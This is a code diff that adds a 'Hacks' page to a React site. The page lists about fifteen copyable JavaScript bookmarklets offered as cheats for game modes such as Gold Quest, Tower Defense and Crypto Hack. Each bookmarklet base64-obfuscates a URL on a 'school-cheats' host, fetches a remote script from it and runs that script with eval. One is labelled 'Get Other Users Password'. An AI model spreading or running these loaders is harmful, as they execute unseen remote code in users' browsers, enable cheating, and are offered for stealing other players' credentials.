@@ -90,6 +90,149 @@ export default function Hacks() {
           </pre>
         </div>
 
+        <div className="p-4 mx-4 mb-4 rounded-lg hover:shadow-2xl text-center">
+          <div className="pb-4"><strong>(Crypto Hack) </strong>Get Crypto</div>
+          <pre className="select-all  prettyprint lang-js rounded-lg p-4 w-full truncate text-white">
+            <code>
+              javascript:fetch(atob(&aops;aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjE0L2NyeXB0b0dldENyeXB0by5qcw==&aops;)).then((res) =&gt; res.text().then((t) =&gt; eval(t)))
+            </code>
+          </pre>
+        </div>
+
+         <div className="p-4 mx-4 mb-4 rounded-lg hover:shadow-2xl text-center">
+          <div className="pb-4"><strong>(Crypto Hack) </strong>Get Other Users Password</div>
+          <pre className="select-all  prettyprint lang-js rounded-lg p-4 w-full truncate text-white">
+            <code>
+              javascript:fetch(atob(&aops;aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2NyeXB0b0hhY2tQYXNzd29yZHMuanM=&aops;)).then((res) =&gt; res.text().then((t) =&gt; eval(t)))
+            </code>
+          </pre>
+        </div>
+
+         <div className="p-4 mx-4 mb-4 rounded-lg hover:shadow-2xl text-center">
+          <div className="pb-4"><strong>(Factory) </strong>Get Mega Bot</div>
+          <pre className="select-all  prettyprint lang-js rounded-lg p-4 w-full truncate text-white">
+            <code>
+              javascript:fetch(atob(&aops;aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2ZhY3RvcnlHZXRNZWdhQm90Lmpz&aops;)).then((res) =&gt; res.text().then((t) =&gt; eval(t)))
+            </code>
+          </pre>
+        </div>
+
+         <div className="p-4 mx-4 mb-4 rounded-lg hover:shadow-2xl text-center">
+          <div className="pb-4"><strong>(Factory) </strong>Get Cash</div>
+          <pre className="select-all  prettyprint lang-js rounded-lg p-4 w-full truncate text-white">
+            <code>
+              javascript:fetch(atob(&aops;aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2ZhY3RvcnlHZXRDYXNoLmpz&aops;)).then((res) =&gt; res.text().then((t) =&gt; eval(t)))
+            </code>
+          </pre>
+        </div>
+
+        <div className="p-4 mx-4 mb-4 rounded-lg hover:shadow-2xl text-center">
+          <div className="pb-4"><strong>(Fishing Frenzy) </strong>Set Weight</div>
+          <pre className="select-all  prettyprint lang-js rounded-lg p-4 w-full truncate text-white">
+            <code>
+              javascript:fetch(atob(&aops;aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2Zpc2hpbmdGcmVuenlTZXRXZWlnaHQuanM=&aops;)).then((res) =&gt; res.text().then((t) =&gt; eval(t)))
+            </code>
+          </pre>
+        </div>
+
+        <div className="p-4 mx-4 mb-4 rounded-lg hover:shadow-2xl text-center">
+          <div className="pb-4"><strong>(Gold Quest) </strong>Get Gold</div>
+          <pre className="select-all  prettyprint lang-js rounded-lg p-4 w-full truncate text-white">
+            <code>
+              javascript:fetch(atob(&aops;aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dvbGRHZXRHb2xkLmpz&aops;)).then((res) =&gt; res.text().then((t) =&gt; eval(t)))
+            </code>
+          </pre>
+        </div>
+
+                <div className="p-4 mx-4 mb-4 rounded-lg hover:shadow-2xl text-center">
+          <div className="pb-4"><strong>(Gold Quest) </strong>Chest ESP</div>
+          <pre className="select-all  prettyprint lang-js rounded-lg p-4 w-full truncate text-white">
+            <code>
+              javascript:fetch(atob(&aops;aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dvbGRDaGVzdEVTUC5qcw==&aops;)).then((res) =&gt; res.text().then((t) =&gt; eval(t)))
+            </code>
+          </pre>
+        </div>
+
+        <div className="p-4 mx-4 mb-4 rounded-lg hover:shadow-2xl text-center">
+          <div className="pb-4"><strong>(Racing) </strong>Instant Win</div>
+          <pre className="select-all  prettyprint lang-js rounded-lg p-4 w-full truncate text-white">
+            <code>
+              javascript:fetch(atob(&aops;aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL3JhY2luZ0luc3RhbnRXaW4uanM=&aops;)).then((res) =&gt; res.text().then((t) =&gt; eval(t)))
+            </code>
+          </pre>
+        </div>
+
+        <div className="p-4 mx-4 mb-4 rounded-lg hover:shadow-2xl text-center">
+          <div className="pb-4"><strong>(Tower Defense) </strong>Change Game Round</div>
+          <pre className="select-all  prettyprint lang-js rounded-lg p-4 w-full truncate text-white">
+            <code>
+              javascript:fetch(atob(&aops;aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjE0L3RkQ2hhbmdlR2FtZVJvdW5kLmpz&aops;)).then((res) =&gt; res.text().then((t) =&gt; eval(t)))
+            </code>
+          </pre>
+        </div>
+
+        <div className="p-4 mx-4 mb-4 rounded-lg hover:shadow-2xl text-center">
+          <div className="pb-4"><strong>(Tower Defense) </strong>Clear Enemies</div>
+          <pre className="select-all  prettyprint lang-js rounded-lg p-4 w-full truncate text-white">
+            <code>
+              javascript:fetch(atob(&aops;aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL3RkQ2xlYXJFbmVtaWVzLmpz&aops;)).then((res) =&gt; res.text().then((t) =&gt; eval(t)))
+            </code>
+          </pre>
+        </div>
+
+        <div className="p-4 mx-4 mb-4 rounded-lg hover:shadow-2xl text-center">
+          <div className="pb-4"><strong>(Tower Defense) </strong>Get Cash</div>
+          <pre className="select-all  prettyprint lang-js rounded-lg p-4 w-full truncate text-white">
+            <code>
+              javascript:fetch(atob(&aops;aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL3RkR2V0Q2FzaC5qcw==&aops;)).then((res) =&gt; res.text().then((t) =&gt; eval(t)))
+            </code>
+          </pre>
+        </div>
+
+        <div className="p-4 mx-4 mb-4 rounded-lg hover:shadow-2xl text-center">
+          <div className="pb-4"><strong>(Tower of Doom) </strong>Add Coins</div>
+          <pre className="select-all  prettyprint lang-js rounded-lg p-4 w-full truncate text-white">
+            <code>
+              javascript:fetch(atob(&aops;aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjE0L3RvZEFkZENvaW5zLmpz&aops;)).then((res) =&gt; res.text().then((t) =&gt; eval(t)))
+            </code>
+          </pre>
+        </div>
+
+        <div className="p-4 mx-4 mb-4 rounded-lg hover:shadow-2xl text-center">
+          <div className="pb-4"><strong>(Tower of Doom) </strong>Lower Enemy Strength</div>
+          <pre className="select-all  prettyprint lang-js rounded-lg p-4 w-full truncate text-white">
+            <code>
+              javascript:fetch(atob(&aops;aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjE0L3RvZExvd2VyRW5lbXlTdHJlbmd0aC5qcw==&aops;)).then((res) =&gt; res.text().then((t) =&gt; eval(t)))
+            </code>
+          </pre>
+        </div>
+
+        <div className="p-4 mx-4 mb-4 rounded-lg hover:shadow-2xl text-center">
+          <div className="pb-4"><strong>(Tower of Doom) </strong>Lower All Enemy Stats</div>
+          <pre className="select-all  prettyprint lang-js rounded-lg p-4 w-full truncate text-white">
+            <code>
+              javascript:fetch(atob(&aops;aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDY2OTkyL3RvZExvd2VyQWxsRW5lbXlTdGF0cy5qcw==&aops;)).then((res) =&gt; res.text().then((t) =&gt; eval(t)))
+            </code>
+          </pre>
+        </div>
+
+        <div className="p-4 mx-4 mb-4 rounded-lg hover:shadow-2xl text-center">
+          <div className="pb-4"><strong>(Tower of Doom) </strong>Lower Enemy Charisma</div>
+          <pre className="select-all  prettyprint lang-js rounded-lg p-4 w-full truncate text-white">
+            <code>
+             javascript:fetch(atob(&aops;aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjE0L3RvZExvd2VyRW5lbXlDaGFyaXNtYS5qcw==&aops;)).then((res) =&gt; res.text().then((t) =&gt; eval(t)))
+            </code>
+          </pre>
+        </div>
+
+        <div className="p-4 mx-4 mb-4 rounded-lg hover:shadow-2xl text-center">
+          <div className="pb-4"><strong>(Tower of Doom) </strong>Lower Enemy Wisdom</div>
+          <pre className="select-all  prettyprint lang-js rounded-lg p-4 w-full truncate text-white">
+            <code>
+             javascript:fetch(atob(&aops;aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjE0L3RvZExvd2VyRW5lbXlXaXNkb20uanM=&aops;)).then((res) =&gt; res.text().then((t) =&gt; eval(t)))
+            </code>
+          </pre>
+        </div>
       </div>
 
     </>
